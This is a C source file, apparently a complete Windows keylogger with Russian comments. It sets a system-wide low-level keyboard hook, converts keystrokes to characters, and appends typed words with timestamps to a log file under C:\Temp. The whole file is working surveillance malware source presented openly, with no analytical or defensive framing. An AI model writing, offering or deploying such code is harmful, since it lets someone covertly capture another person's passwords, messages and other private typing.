// keylogger.c
#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK g_hHook = NULL;
FILE *g_log = NULL;

#define IN 1 /* inside word */
#define OUT 0 /* outside word */
int state = OUT;

// Callback вызываемый при нажатии на клавишу
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {

            time_t mytime = time(NULL);
            struct tm *now = localtime(&mytime);
            char timestamp_str[30];
            // Добавим пробел в конце для лучшей читаемости
            strftime(timestamp_str, sizeof(timestamp_str), "%d.%m.%Y %H:%M:%S ", now);
            BYTE keys[256];
            GetKeyboardState(keys);
            WORD charCode;

            if (ToAscii(pKey->vkCode, pKey->scanCode, keys, &charCode, 0)) {
                char c = (char)charCode;

                if (c == ' ' || c == '\r' || c == '\n' || c == '\t') {
                    if (state == IN) {
                        fprintf(g_log, "\n");
                    }
                    state = OUT;
                }
                else if (c >= 32 && c < 127) {
                    if (state == OUT) {
                        state = IN;
                        fprintf(g_log, "%s", timestamp_str);
                    }
                    fprintf(g_log, "%c", c);
                }
                fflush(g_log);
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_log = fopen("C:\\Temp\\keylog.txt", "a");
    if (!g_log) return 1;

    // Устанавливаем хук на ВСЮ систему
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    if (!g_hHook) {
        fclose(g_log);
        return 1;
    }

    // Запускаем цикл обработки сообщений
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Очистка
    UnhookWindowsHookEx(g_hHook);
    fclose(g_log);
    return 0;
}